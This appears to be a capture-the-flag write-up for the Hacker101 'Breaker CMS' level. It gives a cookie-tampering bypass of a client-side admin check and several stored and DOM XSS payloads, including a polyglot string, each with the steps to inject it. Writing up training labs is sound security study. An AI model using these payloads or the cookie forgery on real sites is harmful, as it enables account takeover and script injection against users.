# Level 3: Breaker CMS

```
		In this level, there are 6 vulnerabilities, falling into the following classes:
		Various XSS
		Improper Authorization
		Unrelated Bonuses

		Have fun!
		
   ```
    
    
 

## Improper Authorization:       
Look at script at bottom of page source:    

```// We should only display the edit link to authenticated admins.
			// http://i.imgur.com/WPaknth.jpg
			var page = window.location.hash.substring(1);
			if(page == '')
				page = 'index';
			var cookies = document.cookie.split(';');
			for(var i in cookies) {
				var cookie = cookies[i].replace(/ /g, '').split('=');
				if(cookie[0] == 'admin' && cookie[1] == '1')
					document.write('<a href="/levels/3/admin?page=' + page + '">Edit this page</a>');
			}
```    
      
      
  
 Go to cookies and change value for admin cookie from 0 to 1:       
 ![Cookie interface in Firefox Quantum](https://github.com/Isopach/Hacker101/blob/master/img/level3_improper_auth1.png)

----

## Stored XSS (Body)

Enter payload into page body edit box and POST     
`"<svg onload=alert(1)>`

![Stored XSS in Body](https://github.com/Isopach/Hacker101/blob/master/img/level3_stored_xss_body.png)

---

## Stored XSS (Body)

Enter payload into page body edit box and POST    
`<a href="https://levels-a.hacker101.com/levels/3/#" onmouseover=alert(1)`   

![Stored_XSS_in_Body_DOM](https://github.com/Isopach/Hacker101/blob/master/img/level3_stored_xss_body_dom.png)

---

## DOM XSS (Head)

Enter payload into title:     

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```


![Self XSS in Head](https://github.com/Isopach/Hacker101/blob/master/img/level3_self_xss_head.png)
